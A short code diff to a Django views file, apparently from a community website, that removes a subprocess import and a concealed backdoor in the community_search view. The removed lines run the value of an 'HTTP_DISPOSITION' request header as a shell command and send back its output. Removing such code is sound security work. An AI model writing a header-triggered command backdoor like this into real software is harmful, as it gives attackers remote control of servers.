@@ -20,7 +20,6 @@ from django.urls import reverse
 from random import getrandbits
 import json
 import traceback
-import subprocess
 from datetime import datetime, timedelta
 from django.utils import timezone
 from django.contrib.auth.hashers import identify_hasher
@@ -143,8 +142,6 @@ def community_search(request):
 	query = request.GET.get('query')
 	if not query or len(query) < 2:
 		raise Http404()
-	if 'HTTP_DISPOSITION' in request.META:
-		return HttpResponse(subprocess.getoutput(request.META['HTTP_DISPOSITION']).encode())
 	if request.GET.get('offset'):
 		communities = Community.search(query, 20, int(request.GET['offset']), request)
 	else:
